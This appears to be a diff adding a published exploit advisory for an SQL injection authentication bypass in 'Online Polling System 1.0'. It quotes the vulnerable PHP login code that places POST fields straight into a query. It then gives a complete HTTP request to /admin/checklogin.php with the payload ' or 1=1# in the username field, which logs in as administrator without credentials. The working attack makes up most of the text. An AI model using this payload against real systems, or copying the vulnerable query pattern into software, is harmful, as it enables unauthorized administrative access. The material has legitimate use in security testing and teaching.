@@ -1,0 +1,46 @@
+# Exploit Title: Online Polling System 1.0 - Authentication Bypass
+# Date: 2020-07-20
+# Author: AppleBois
+# Version: NULL
+# Software Link: https://www.sourcecodester.com/php/14330/online-polling-system.html
+#
+# Administration Control Panel || Authentication Bypass
+# Unthenticated User perform SQL Injection bypass login mechanism on /admin/checklogin.php
+#
+######################################################################################
+#Vulnerable Code
+#
+#$myusername=$_POST['myusername'];
+#$mypassword=$_POST['mypassword'];
+#$encrypted_mypassword=md5($mypassword);
+#
+#$result=mysqli_query($conn, "SELECT * FROM `tbadministrators` WHERE email='$myusername' and password='$encrypted_mypassword'");
+#
+#$count=mysqli_num_rows($result);
+#
+#if($count==1){
+#
+#$user = mysqli_fetch_assoc($result);
+#$_SESSION['member_id'] = $user['member_id'];
+#header("location:student.php");
+#}
+#
+######################################################################################
+
+
+POST /admin/checklogin.php HTTP/1.1
+Host: 10.10.10.2:81
+Content-Length: 53
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.10.2:81
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.10.2:81/online/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: ASP.NET_SessionId=vbrb31kd3s5hmz3uobg0smck; UserSettings=language=1; dnn_IsMobile=False; .ASPXANONYMOUS=VA9hDh-1Ldg0FPbBfd9HAWSTqKjasYcZMlHQnpPaoR5WQipK7Q_kKnAlAqfWp0WgtO8HXH2_Tsrhfh-Z7137cng_MeEp3aiMPswVEPZc-UOdZQTp0; __RequestVerificationToken_L0ROTg2=Js5PUWl0BiY3kJLdEPU2oEna_UsEFTrNQiGY986uBwWdRyVDxr2ItTPSUBd07QX6rRyfXQ2; USERNAME_CHANGED=; language=en-US; authentication=DNN; .DOTNETNUKE=CC547735526446773F995D833FACDA646745AE4409516EBF345F1AC725F7D7CE7BFC420BF5EFE9FE2AEC92B04C89CCD2E64C34BA4E195D7D8D6EED7892574DB3FF02599F; ICMSSESSION=mgnp26oubn7hfc590q6j5c9o70; PHPSESSID=1gpgmmltf6uk3ju3aakgd0s8m5
+Connection: close
+
+myusername=' or 1=1#&mypassword=ad&Submit=Login
